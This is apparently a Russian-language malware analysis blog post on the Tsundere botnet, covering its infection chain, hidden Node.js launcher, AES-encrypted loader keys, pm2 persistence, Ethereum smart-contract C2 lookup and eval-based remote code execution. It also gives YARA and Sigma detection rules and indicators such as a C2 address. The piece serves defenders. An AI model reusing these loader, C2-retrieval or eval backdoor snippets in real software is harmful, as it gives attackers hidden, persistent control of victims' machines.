---
title: "Tsundere Botnet: злоупотребление Node.js и блокчейна Ethereum для устойчивого C2"
date: 2026-01-12
draft: false
description: "Tsundere Botnet: злоупотребление Node.js и блокчейна Ethereum для устойчивого C2"
image: "/cdn/blog-cdn/large_photo_2026_01_12_11_00_05_5d405ef7e6.jpg"
---

## 1. Введение

В 2025 году исследователи столкнулись с новым этапом эволюции JavaScript-вредоносного ПО — ботнетом Tsundere, активно использующим экосистему Node.js и блокчейн Ethereum. В отличие от классических ботнетов, где C2-адреса жёстко зашиты в коде или меняются через доменные генераторы, Tsundere применяет смарт-контракты как распределённое хранилище командных серверов. Такой подход резко усложняет инфраструктурное противодействие и делает ботнет устойчивым к блокировкам и takedown-операциям.

## 2. Цепочка заражения (Kill Chain)

```plain
Initial Access
 ├─ Fake MSI / PowerShell dropper
 ├─ RMM / pirated software
 └─ Game lures (valorant.exe, cs2.msi)

Execution
 ├─ Node.js runtime (bundled or downloaded)
 └─ Obfuscated JS loader

Persistence
 ├─ HKCU\...\Run
 └─ pm2 autostart

C2
 ├─ Ethereum smart contract
 └─ WebSocket (ws / wss)

Command Execution
 └─ eval() arbitrary JS
```

## 3. MSI-инфектор: технический разбор

MSI-файл играет роль не просто дроппера, а полноценного установщика среды выполнения. Вместе с вредоносными файлами он размещает легитимные бинарники Node.js в каталоге пользователя (AppData\Local\nodejs).
Запуск вредоносного кода происходит через CustomAction, где Windows Installer вызывает PowerShell, а тот, в свою очередь, стартует Node.js в скрытом режиме. Важный момент — процесс создаётся отсоединённым (detached) и без вывода, что затрудняет его обнаружение стандартными средствами мониторинга.

> На практике подобное поведение редко встречается в легитимных установщиках и является сильным индикатором компрометации.

### 3.1 CustomAction → PowerShell → Node.js

`powershell -WindowStyle Hidden -NoLogo -enc <BASE64>`

После декодирования:

```js
const { spawn } = require('child_process');

spawn(
  process.env.LOCALAPPDATA + '\\nodejs\\node.exe',
  ['B4jHWzJnlABB2B7'],
  {
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
    cwd: __dirname
  }
).unref();
```

> Критичный момент
> Запуск Node.js из пользовательского каталога + detached + windowsHide — сильный IOC.

## 4. Loader: AES-256-CBC unpacking

### 4.1 Конфигурация дешифрования

```js
key = Buffer.from(
 '2l+jfiPEJufKA1bmMTesfxcBmQwFmmamIGM0b4YfkPQ=',
 'base64'
);

iv = Buffer.from(
 'NxrqwWI+zQB+XL4+I/042A==',
 'base64'
);
```

**Файлы:**

`thoJahgqObmWWA2` → основной бот

`79juqlY2mETeQOc` → конфигурация

### 4.2 Назначение config.json

Файл описывает:

* структуру `node_modules`;
* пакеты (`ws`, `ethers`, `pm2`);
* автозапуск и рабочие директории.

Фактически это встроенный npm-bundle без npm install из интернета.

## 5. Persistence через pm2

Одним из ключевых элементов закрепления является pm2 — популярный менеджер процессов для Node.js. В легитимных сценариях он используется для поддержки серверных приложений, однако в данном случае выполняет роль:

* watchdog-процесса;
* средства автозапуска при входе пользователя;
* механизма перезапуска бота при сбоях.

Важно подчеркнуть, что наличие pm2 на пользовательской рабочей станции (а не на сервере) само по себе является нетипичным и должно рассматриваться как подозрительное.
**Выглядит это так:**

* pm2 start bot.js
* pm2 save
* pm2 startup windows

**pm2:**

* создаёт Run-ключи;
* перезапускает процесс при логине;
* маскируется под легитимный Node-workflow.

>pm2 на пользовательской машине ≠ норма.

## 6. PowerShell-инжектор (альтернатива MSI)

PowerShell-вариант отличается меньшей сложностью, но тем же функционалом. Он загружает официальный архив Node.js, разворачивает его локально и затем расшифровывает два ключевых компонента:

* основной бот;
* скрипт закрепления.

После этого создаётся package.json, устанавливаются необходимые зависимости, и вредоносное ПО запускается аналогично MSI-варианту. С точки зрения атакующего это универсальный и гибкий метод доставки, не зависящий от Windows Installer.

### 6.1 Ключевые особенности

1. загрузка официального Node.js ZIP;
2. AES-256-CBC decrypt payload;
3. генерация package.json:

```js
{
  "dependencies": {
    "ws": "^8.0.0",
    "ethers": "^5.7.2"
  }
}
```

\4. запуск persistence-скрипта;
5. самоперезапись PowerShell-файла (anti-forensics).

## 7. C2 через Ethereum Smart Contract

### 7.1 Архитектура

```plain
Bot
 └─ ethers.js
     └─ RPC (Infura / public nodes)
         └─ Smart Contract
             └─ param1 = "ws://X.X.X.X:PORT"
```

### 7.2 Код извлечения C2 (упрощённо)

```js
const provider = new ethers.providers.JsonRpcProvider(RPC);
const contract = new ethers.Contract(addr, abi, provider);

const wsC2 = await contract.param1();

if (wsC2.startsWith("ws")) {
  connect(wsC2);
}
```

> Использование блокчейна как C2-DNS — ключевая особенность.

## 8. Командное управление

После установления WebSocket-соединения бот обменивается ключами и переходит на зашифрованный канал связи. Команды от сервера передаются в виде JavaScript-кода, который выполняется через eval().
Такой подход делает бот максимально универсальным: фактически он представляет собой удалённую среду выполнения JavaScript с доступом к системе жертвы. При этом на момент наблюдений активное использование командного интерфейса зафиксировано не было, что может указывать на стадию накопления ботов.

**Eval-based execution**

```js
if (msg.id === 1) {
  const fn = eval(msg.code);
  const result = fn();
  serverSend(result);
}
```

✔ Arbitrary JS

✔ Полный контроль системы

✔ Лёгкое расширение функционала

## 9. YARA-правила детекции

### 9.1 Node.js + Ethereum C2

```yara
rule Tsundere_Node_Ethereum_C2 {
  meta:
    author = "GReAT"
    threat = "Tsundere Botnet"
  strings:
    $ethers = "ethers.providers.JsonRpcProvider"
    $ws = "new WebSocket("
    $eval = "eval(msg.code)"
    $aes = "aes-256-cbc"
  condition:
    all of them
}
```

### 9.2 MSI Loader

```yara
rule Tsundere_MSI_Node_Loader {
  strings:
    $node = "\\nodejs\\node.exe"
    $spawn = "child_process"
    $detach = "detached: true"
  condition:
    2 of them
}
```

## 10. Sigma / YAML (Windows Detection)

### 10.1 Запуск Node.js из AppData

```yaml
title: Suspicious Node.js Execution from AppData
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\node.exe'
    CommandLine|contains: 'AppData\\Local\\nodejs'
  condition: selection
level: high
```

### 10.2 pm2 persistence

```yaml
title: PM2 Autostart Persistence
logsource:
  product: windows
  category: registry_event
detection:
  selection:
    TargetObject|contains: 'CurrentVersion\\Run'
    Details|contains: 'pm2'
  condition: selection
level: high
```

## 11. IOC (кратко)

Wallet: `0x73625B6cdFECC81A4899D221C732E1f73e504a32`

C2: `ws://185.28.119[.]179:1234`

Path: `%LOCALAPPDATA%\NodeJS`

Tools: `ethers.js`, `ws`, `pm2`

## 12. Выводы

Tsundere демонстрирует, как привычные и легитимные технологии — Node.js, npm, pm2, Ethereum — могут быть объединены в устойчивую вредоносную экосистему. Это уже не «экзотика», а практический пример того, каким будет массовое malware-развитие в ближайшие годы.

Для специалистов по ИБ ключевой вывод прост: контекст использования технологий важнее самих технологий. Node.js на рабочей станции, WebSocket к случайному IP и RPC-запросы к блокчейну в пользовательской среде — это не норма и должно рассматриваться как потенциальный инцидент.
